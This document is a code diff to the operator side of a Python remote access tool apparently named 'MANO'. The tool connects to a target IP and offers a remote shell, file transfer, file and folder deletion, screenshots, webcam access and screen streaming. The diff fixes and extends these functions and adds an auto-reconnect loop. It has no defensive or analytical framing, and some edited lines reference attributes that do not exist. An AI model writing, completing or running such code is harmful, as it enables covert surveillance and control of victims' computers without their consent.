@@ -2,8 +2,8 @@
 import socket
 import sys
 import os
-import threading
 import time
+import datetime
 import shutil
 import cv2
 import pickle
@@ -42,20 +42,20 @@ class Deleter:
         print(f"""----------------------------------------------------------------------------
 1. Delete file 
 2. Delet Dir/Folder 
-3. Change {self.context.address[0] if self.context else 'your' } directory
+3. Change {self.context.host if self.context else 'your' } directory
 4. File list
-5. Exit 
+5. Back 
 ----------------------------------------------------------------------------""")
 
     def handle_deleter(self):
         while True:
             self.delete_menu()
-            option = input("Enter your choice : ")
+            option = input("Enter your choice : ").strip()
             if option == '1':
-                file_name=input("Enter file name to delete : ")
+                file_name=input("Enter file name to delete : ").strip()
                 print(self.delete_file(file_name))
             elif option == '2':
-                folder_name=input("Enter folder name to delete : ")
+                folder_name=input("Enter folder name to delete : ").strip()
                 print(self.delete_folder(folder_name))
             elif option == '3':
                 print(self.change_directory())
@@ -95,19 +95,20 @@ class Deleter:
             
     def change_directory(self):
         if isinstance(self.context,Client):
-            self.context.sock.send(('cwd~s').encode("utf-8"))
+            self.context.sock.send(('cdir~s').encode("utf-8"))
             print("client current working dir : "+self.context.sock.recv(1024).decode("utf-8"))
-            if input("Do you want to change (Y/N) ? : ").upper() == 'Y':
-                dire=input("Enter path to change: ")
-                self.context.sock.send((dire).encode("utf-8"))
+            if input("Do you want to change (Y/N) ? : ").upper().strip() == 'Y':
+                self.context.conn.send(('Y').encode("utf-8"))
+                dire=input("Enter path to change: ").strip()
+                self.context.conn.send((dire).encode("utf-8"))
                 return self.context.sock.recv(1024).decode("utf-8")
             else:
                 return
         else:
             try:
                 print("Your current working directory : "+os.getcwd())
-                if input("Do you want to change (Y/N) ? : ").upper() == 'Y':
-                    dire=input("Enter path to change: ")
+                if input("Do you want to change (Y/N) ? : ").upper().strip() == 'Y':
+                    dire=input("Enter path to change: ").strip()
                     os.chdir(dire)
                     return os.getcwd()
                 else:
@@ -128,13 +129,13 @@ class Client:
         try:
             port = 9999
             self.sock = socket.socket()
-            self.host= input('Enter Target IP or q or Q to exit :')
+            self.host= input('Enter Target IP or q or Q to exit : ').strip()
             if self.host=='q' or self.host=='Q':
                 exit(0)
-            self.sock.sockect((self.host, port))
+            self.sock.connect((self.host, port))
+            self.deleter=Deleter(self)
         except socket.error as msg:
             print("Socket creation error: " + str(msg))
-            self.deleter=Deleter(self)
 
     def __str__(self):
         return f"{self.sock} {self.host}"
@@ -142,7 +143,7 @@ class Client:
     #upload file to client
     def send_file(self,filename):
         if os.path.isfile(filename):
-            self.sock.send(str("fup~"+filename).encode("utf-8"))
+            self.sock.send(str("fdown~"+filename).encode("utf-8"))
             self.sock.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
             filesize=int(os.path.getsize(filename))
             userResponse = self.sock.recv(1024).decode("utf-8")
@@ -163,11 +164,11 @@ class Client:
 
     #download file from client
     def receive_file(self,filename):
-        self.sock.send(("fdown~"+filename).encode("utf-8"))
+        self.sock.send(("fup~"+filename).encode("utf-8"))
         data = self.sock.recv(1024).decode("utf-8")
         if data[:6] == 'EXISTS':
             filesize = data[6:]
-            msg = input("File exists, " + str(filesize) +"Bytes, download? (Y/N)? -> ").upper()
+            msg = input("File exists, " + str(filesize) +"Bytes, download? (Y/N)? -> ").upper().strip()
             if msg == 'Y':
                 self.sock.send("OK".encode("utf-8"))
                 f = open(filename, 'wb')
@@ -187,11 +188,11 @@ class Client:
             print("File Does Not Exist!")
 
     #take screenshot of client screen
-    def take_screenshot(self,filename):
+    def take_screenshot(self):
         self.sock.send(('sshot~s').encode("utf-8"))
         msg=self.sock.recv(1024).decode("utf-8")
         if msg=='OK':
-            filename=filename+".jpg"
+            filename= 'screenshot_'+str(datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))+'.jpg'
             data = self.sock.recv(1024).decode("utf-8")
             if data[:6] == 'EXISTS':
                 filesize = data[6:]
@@ -205,6 +206,7 @@ class Client:
                     totalRecv += len(data)
                     f.write(data)
                 f.close()
+                print("Screenshot saved as "+filename)
             else:
                 print("Fail to take screenshot!")
         else:
@@ -212,6 +214,7 @@ class Client:
 
     #access client camera
     def access_camera(self):
+        self.sock.send(('cam~s').encode("utf-8"))
         K=self.sock.recv(1024).decode("utf-8")
         if K=="OK":
             C=self.sock.recv(1024).decode("utf-8")
@@ -243,6 +246,7 @@ class Client:
 
     #stream client screen
     def stream_screen(self):
+        self.sock.send(('stream~s').encode("utf-8"))
         K=self.sock.recv(1024).decode("utf-8")
         if K=="OK":
             while True:
@@ -280,7 +284,7 @@ class Client:
         print(client_response, end="")
         while True:
             try:
-                cmd = input('')
+                cmd = input('').strip()
                 if cmd== 'quit':
                     return
                 cmd='cmd~'+cmd
@@ -294,7 +298,7 @@ class Client:
 
     #close sockection
     def close(self):
-        self.sock.close()
+        self.sock.send(('exit~s').encode("utf-8"))
         return
     
     def help(self):
@@ -314,21 +318,22 @@ sshot   --> To take screenshot of target's screen
 cam     --> To access target camera
 stream  --> To stream target screen
 help    --> Help 
-back    --> Back to MANO
-exit    --> To terminate : {self.address[0]}""")
+close    --> To terminate : {self.host}""")
         
         #commands that perform on client
     def menu(self):
         deleter = Deleter(None)
         while True:
-            cli= input("MANO >>"+self.address[0]+" >> ")
-            if cli=='shell':
+            cli= input("MANO >>"+self.host+" >> ").strip()
+            if cli=='':
+                continue
+            elif cli=='shell':
                 self.send_command('echo')
             elif cli=='fdown':
-                filename=input("Enter file name to download : ")
-                print(self.receive_file(filename))
+                filename=input("Enter file name to download : ").strip()
+                self.receive_file(filename)
             elif cli=='fup':
-                filename=input("Enter file name to upload : ")
+                filename=input("Enter file name to upload : ").strip()
                 print(self.send_file(filename))
             elif cli=='fl':
                 print(deleter.list_files())
@@ -339,31 +344,35 @@ exit    --> To terminate : {self.address[0]}""")
             elif cli=='ccd':
                 print(self.deleter.change_directory())            
             elif cli=='cdel':
-                print(self.deleter.delete_file())
+                self.handle_deleter()
             elif cli=='fdel':
-                print(deleter.delete_file())
+                deleter.handle_deleter()
             elif cli=='pwd':
                 print("Your current working directory : "+os.getcwd())
             elif cli=='cwd':
                 self.sock.send(('cwd~s').encode("utf-8"))
-                print("Client current working directory :"+self.sock.recv(1024).decode("utf-8"))
+                print("Client current working directory : "+self.sock.recv(1024).decode("utf-8"))
             elif cli=='sshot':
                 self.take_screenshot()
             elif cli=='cam':
                 self.access_camera()
             elif cli=='stream':
                 self.stream_screen()
-            elif cli=='back':
-                return
-            elif cli=='exit':
-                self.sock.send(('exit~s').encode("utf-8"))
-                return
+            elif cli=='close':
+                self.close()
+                return 
             elif cli == 'help':
                 self.help()
             else :
                 print("Command not recognized")
 
-while True:
-    client = Client()
-    client.menu()
-              
+if __name__ == '__main__':
+    banner()
+    while True:
+        try:
+            client=Client()
+            client.menu()
+        except Exception as e:
+            print(f"Error : {e}")
+            time.sleep(5)
+            
